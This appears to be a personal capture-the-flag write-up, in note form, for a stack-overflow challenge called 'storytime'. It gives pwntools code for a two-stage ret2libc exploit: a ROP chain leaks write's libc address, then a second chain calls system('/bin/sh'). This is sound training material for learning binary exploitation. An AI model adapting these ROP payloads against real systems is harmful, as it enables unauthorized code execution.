	- `checksec`
  ![[hs19_storytime_nightmare-1.png]]
- decompile:
  ![[hs19_storytime_nightmare-2.png]]
  ![[hs19_storytime_nightmare-3.png]]
  3 other funcs only include `write()`
- NX on, no canary, `read()`, `write()` -> [[ret2libc]] + [[ROP]] via `write()`
- step 1: leak libc base via `write()` and ret to `climax()`, using ROP
- offset = 56 = 0x38
  ![[hs19_storytime_nightmare-4.png]]
- payload:
  ```python
	climax = 0x40060e
	puts_plt = exe.plt['write']
	puts_got = exe.got['write']
	pop_rsi_r15 = 0x0000000000400701
	pop_rdi = 0x0000000000400703
	payload = flat(
	    b'A' * 56,
	    pop_rdi,
	    1,
	    pop_rsi_r15,
	    puts_got,
	    0xdeadbeef,
	    puts_plt,
	    climax
	)
	p.sendafter(b'Tell me a story: \n', payload)
  ```
- to use`write.plt`, rsi = address write / `write.got`, rdi = 1
- step 2: ROP
- find offset 
  ![[hs19_storytime_nightmare-5.png]]
- payload:
  ```python
	leak = u64(p.recv(6).ljust(8, b'\x00'))
	log.info(f'leak: {hex(leak)}')
	libc.address = leak - 0xf72b0
	log.info(f'base: {hex(libc.address)}')
	payload = flat(
	    b'B' * 56,
	    pop_rdi,
	    next(libc.search(b'/bin/sh\x00')),
	    libc.symbols['system']
	)
	p.send(payload)
  ```